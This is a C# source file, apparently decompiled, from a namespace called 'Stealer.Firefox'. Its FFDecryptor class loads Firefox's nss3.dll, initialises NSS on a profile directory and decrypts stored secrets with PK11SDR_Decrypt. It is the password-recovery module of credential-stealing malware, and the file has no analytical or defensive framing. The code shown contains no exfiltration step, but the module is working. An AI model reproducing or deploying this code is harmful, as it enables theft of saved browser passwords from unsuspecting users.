using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Stealer.Firefox
{
	// Token: 0x0200001C RID: 28
	internal static class FFDecryptor
	{
		// Token: 0x0600008B RID: 139
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string dllFilePath);

		// Token: 0x0600008C RID: 140
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0600008D RID: 141 RVA: 0x000060F4 File Offset: 0x000042F4
		public static long NSS_Init(string configdir)
		{
			long num;
			try
			{
				bool flag = Directory.Exists("C:\\Program Files\\Mozilla Firefox");
				string text;
				if (flag)
				{
					text = "C:\\Program Files\\Mozilla Firefox\\";
				}
				else
				{
					bool flag2 = Directory.Exists("C:\\Program Files (x86)\\Mozilla Firefox");
					if (flag2)
					{
						text = "C:\\Program Files (x86)\\Mozilla Firefox\\";
					}
					else
					{
						text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
					}
				}
				FFDecryptor.LoadLibrary(text + "mozglue.dll");
				FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(text + "nss3.dll");
				num = ((FFDecryptor.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "NSS_Init"), typeof(FFDecryptor.DLLFunctionDelegate)))(configdir);
			}
			catch (Exception ex)
			{
				num = 0L;
			}
			return num;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000061C8 File Offset: 0x000043C8
		public static string Decrypt(string cypherText)
		{
			IntPtr intPtr = IntPtr.Zero;
			StringBuilder stringBuilder = new StringBuilder(cypherText);
			try
			{
				byte[] array = Convert.FromBase64String(cypherText);
				intPtr = Marshal.AllocHGlobal(array.Length);
				Marshal.Copy(array, 0, intPtr, array.Length);
				FFDecryptor.TSECItem tsecitem = default(FFDecryptor.TSECItem);
				FFDecryptor.TSECItem tsecitem2 = default(FFDecryptor.TSECItem);
				tsecitem2.SECItemType = 0;
				tsecitem2.SECItemData = intPtr;
				tsecitem2.SECItemLen = array.Length;
				bool flag = FFDecryptor.PK11SDR_Decrypt(ref tsecitem2, ref tsecitem, 0) == 0;
				if (flag)
				{
					bool flag2 = tsecitem.SECItemLen != 0;
					if (flag2)
					{
						byte[] array2 = new byte[tsecitem.SECItemLen];
						Marshal.Copy(tsecitem.SECItemData, array2, 0, tsecitem.SECItemLen);
						return Encoding.ASCII.GetString(array2);
					}
				}
			}
			catch
			{
				return null;
			}
			finally
			{
				bool flag3 = intPtr != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return null;
		}

		// Token: 0x0600008F RID: 143 RVA: 0x000062E8 File Offset: 0x000044E8
		public static int PK11SDR_Decrypt(ref FFDecryptor.TSECItem data, ref FFDecryptor.TSECItem result, int cx)
		{
			IntPtr procAddress = FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "PK11SDR_Decrypt");
			FFDecryptor.DLLFunctionDelegate5 dllfunctionDelegate = (FFDecryptor.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(FFDecryptor.DLLFunctionDelegate5));
			return dllfunctionDelegate(ref data, ref result, cx);
		}

		// Token: 0x04000076 RID: 118
		private static IntPtr NSS3;

		// Token: 0x02000202 RID: 514
		// (Invoke) Token: 0x06001682 RID: 5762
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		// Token: 0x02000203 RID: 515
		// (Invoke) Token: 0x06001686 RID: 5766
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x02000204 RID: 516
		// (Invoke) Token: 0x0600168A RID: 5770
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref FFDecryptor.TSECItem data, ref FFDecryptor.TSECItem result, int cx);

		// Token: 0x02000205 RID: 517
		public struct TSECItem
		{
			// Token: 0x04000962 RID: 2402
			public int SECItemType;

			// Token: 0x04000963 RID: 2403
			public IntPtr SECItemData;

			// Token: 0x04000964 RID: 2404
			public int SECItemLen;
		}
	}
}
